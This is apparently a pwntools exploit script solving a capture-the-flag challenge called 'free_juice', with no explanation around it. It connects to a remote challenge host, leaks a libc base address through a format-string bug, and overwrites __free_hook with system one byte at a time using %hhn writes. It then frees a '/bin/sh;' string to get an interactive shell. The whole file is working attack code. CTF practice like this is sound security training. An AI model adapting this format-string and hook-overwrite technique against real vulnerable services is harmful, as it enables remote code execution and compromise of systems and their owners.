from pwn import *
#io = process("./free_juice")
io = remote("13.229.222.125",33156)
libc = ELF("./libc-2.23.so")

def chooseJuice():
    io.sendlineafter(b"Enter your choice:",b"1")
    io.sendlineafter(b"(1-5):",b"1")

def secretJuice(a):
    io.sendlineafter(b"Enter your choice:",b"1337")
    io.sendlineafter(b"you!",a)

def drinkJuice():
    io.sendlineafter(b"Enter your choice:",b"3")

chooseJuice()

# leak libc
secretJuice(b"%13$p")
io.recvuntil(b": ")
libc.address = int(io.recv(14).decode(),16) - 271 - libc.symbols["__isoc99_scanf"] 
log.info("LIBC BASE: " + hex(libc.address))

# cheese the chall
# overwrite __free_hook with system
system = p64(libc.symbols["system"])[:-2]
freehook = libc.symbols["__free_hook"]
log.info("system@libc: " + hex(libc.symbols["system"]))
log.info("__free_hook: " + hex(libc.symbols["__free_hook"]))

for i in system:
    formatstr  = b"%" + str(i).rjust(3,"0").encode() + b"c"
    formatstr += b"%8$hhn"
    formatstr  = formatstr.ljust(16,b"A")
    formatstr += p64(freehook)[:-2]
    secretJuice(formatstr)
    freehook += 1


secretJuice(b"/bin/sh;")
drinkJuice()
io.interactive()

